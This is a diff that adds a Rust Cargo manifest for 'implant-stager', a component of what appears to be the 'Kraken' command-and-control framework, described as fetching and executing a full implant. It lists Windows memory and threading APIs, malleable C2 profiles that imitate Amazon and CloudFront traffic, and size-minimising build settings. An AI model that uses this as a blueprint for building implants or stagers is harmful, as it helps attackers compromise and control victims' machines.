@@ -1,0 +1,60 @@
+[package]
+name = "implant-stager"
+version.workspace = true
+edition.workspace = true
+description = "Kraken minimal stager - fetches and executes full implant"
+
+[[bin]]
+name = "stager"
+path = "src/main.rs"
+
+[lib]
+name = "implant_stager"
+path = "src/lib.rs"
+
+[dependencies]
+crypto = { path = "../crypto" }
+config = { path = "../config" }
+common = { path = "../common" }
+
+# Minimal async runtime
+tokio = { workspace = true, default-features = false, features = ["rt", "time", "sync"] }
+
+# Crypto primitives
+ring = { workspace = true }
+zeroize = { workspace = true }
+
+# Minimal dependencies for size
+rand = { version = "0.8", default-features = false, features = ["std", "std_rng"] }
+
+[target.'cfg(unix)'.dependencies]
+libc = "0.2"
+# Minimal HTTP client
+ureq = { version = "2.9", default-features = false, features = ["tls"] }
+
+[target.'cfg(windows)'.dependencies]
+windows-sys = { version = "0.52", features = [
+    "Win32_Foundation",
+    "Win32_Networking_WinHttp",
+    "Win32_System_Memory",
+    "Win32_System_Threading",
+    "Win32_System_LibraryLoader",
+    "Win32_Security",
+] }
+
+[features]
+default = []
+# Profile support for malleable C2
+profile-amazon = []
+profile-cloudfront = []
+profile-generic = []
+
+[dev-dependencies]
+tokio-test = { workspace = true }
+
+[profile.release]
+opt-level = "z"
+lto = true
+codegen-units = 1
+panic = "abort"
+strip = true
